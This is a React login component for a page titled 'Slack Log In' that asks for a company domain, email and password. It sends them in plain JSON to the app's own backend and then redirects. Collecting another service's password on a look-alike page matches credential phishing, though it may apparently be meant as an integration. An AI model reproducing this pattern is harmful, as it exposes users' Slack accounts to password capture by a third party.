import React, { useEffect, useRef, useState } from "react";
import { ToastContainer, toast } from "react-toastify";

const Login = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [buttonText, setButtonText] = useState("Sign In");
  const [domain, setDomain] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isDomainError, setIsDomainError] = useState(false);
  const [isEmailError, setIsEmailError] = useState(false);
  const [isPasswordError, setIsPasswordError] = useState(false);
  const [id, setId] = useState("");

  const formRef = useRef(null);

  useEffect(() => {
    const tempId = window.localStorage.getItem("id");

    if (!tempId) {
      toast("ID not found.", {
        type: "error",
      });
    } else {
      setId(tempId);
    }
  }, []);

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (domain.trim() === "") setIsDomainError(() => true);
    if (email.trim() === "") setIsEmailError(() => true);
    if (password.trim() === "") setIsPasswordError(() => true);

    if (domain.trim() === "" || email.trim() === "" || password.trim() === "") {
      return;
    }

    if (!id) {
      toast("ID not found", {
        type: "error",
      });
      return;
    }

    const apiUrl = process.env.REACT_APP_URL + "/users/login/" + id;
    setButtonText("Logging..");
    setIsLoading(true);
    fetch(apiUrl, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        id: id,
        requestDomain: domain,
        email: email,
        password: password,
      }),
    })
      .then(async (response) => {
        const data = await response.json();
        if (data.data.redirectUrl) {
          window.localStorage.removeItem("id");
          window.location.href = data.data.redirectUrl;
        }
      })
      .catch(() => {
        toast("Incorrect Credentials", {
          type: "error",
        });
      })
      .finally(() => {
        setButtonText("Sign In");
        setIsLoading(false);
      });
  };
  return (
    <div className="container">
      <ToastContainer toastClassName={"toast-custom"} position="top-center" hideProgressBar limit={1} closeButton={false} closeOnClick={false} />
      <img src="/assets/logo_big.svg" alt="logo" className="logo_big" />
      <div className="integration">
        <img src="/assets/slack_logo.svg" alt="slack" />
        <img src="/assets/infinity.svg" alt="infinity" />
        <img src="/assets/logo.svg" alt="logo" />
      </div>
      <div className="title">
        <div className="sub-title">Welcome</div>
        <div className="heading">Slack Log In</div>
      </div>
      <form ref={formRef} onSubmit={handleSubmit}>
        <div className="input-item">
          <div className="label">Company Domain</div>
          <input
            disabled={!id}
            type="text"
            onChange={(e) => {
              setDomain(e.target.value);
              if (e.target.value.trim().length >= 1) setIsDomainError(false);
              else setIsDomainError(true);
            }}
            placeholder="Company Domain"
          />
          {isDomainError && <div className="form-error">Domain cannot be empty.</div>}
        </div>
        <div className="input-item">
          <div className="label">Email</div>
          <input
            disabled={!id}
            type="email"
            onChange={(e) => {
              setEmail(e.target.value);
              const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
              if (!emailRegex.test(e.target.value)) {
                setIsEmailError(true);
              } else {
                setIsEmailError(false);
              }
            }}
            placeholder="Email"
          />
          {isEmailError && <div className="form-error">Email is not valid.</div>}
        </div>
        <div className="input-item">
          <div className="label">Password</div>
          <input
            disabled={!id}
            type="password"
            placeholder="Password"
            onChange={(event) => {
              setPassword(event.target.value);
              if (event.target.value.trim().length >= 8) setIsPasswordError(false);
              else setIsPasswordError(true);
            }}
          />
          {isPasswordError && <div className="form-error">Password must be minimum 8 characters.</div>}
        </div>
        <button type="submit" disabled={!id || isLoading || isEmailError || isEmailError || isPasswordError}>
          {buttonText}
        </button>
      </form>
    </div>
  );
};

export default Login;
